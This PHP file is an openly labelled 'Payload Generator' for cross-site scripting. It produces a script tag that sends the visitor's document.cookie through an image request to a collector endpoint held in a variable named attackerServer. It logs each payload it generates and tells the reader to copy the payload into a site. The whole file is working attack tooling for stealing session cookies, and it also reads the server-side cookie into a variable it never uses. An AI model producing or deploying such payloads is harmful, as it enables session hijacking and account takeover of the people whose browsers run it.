<?php
// Change the target URL to log.php
$attackerServer = "http://localhost/.devcontainer/log.php?c=";

// Get the cookie value
$cookieValue = $_COOKIE['session_id'] ?? $_COOKIE['PHPSESSID'] ?? '';

// Construct the payload string
$encodedCookie = urlencode($cookieValue);

// The updated payload string
$payloadString = "<script>new Image().src=\"{$attackerServer}\" + encodeURIComponent(document.cookie);</script>";

echo "Generated Payload:\n";
echo $payloadString . "\n\n";

// Optional: Log the generation event
$logFile = __DIR__ . '/payload_log.txt';
file_put_contents($logFile, date('Y-m-d H:i:s') . " - Payload Generated: " . $payloadString . "\n", FILE_APPEND);

// Show in browser
?>
<!DOCTYPE html>
<html>
<head><title>Payload Generator</title></head>
<body>
    <h1>Payload Generator</h1>
    <p>Copy this code to your site:</p>
    <textarea rows="4" cols="50"><?php echo $payloadString; ?></textarea>
</body>
</html>
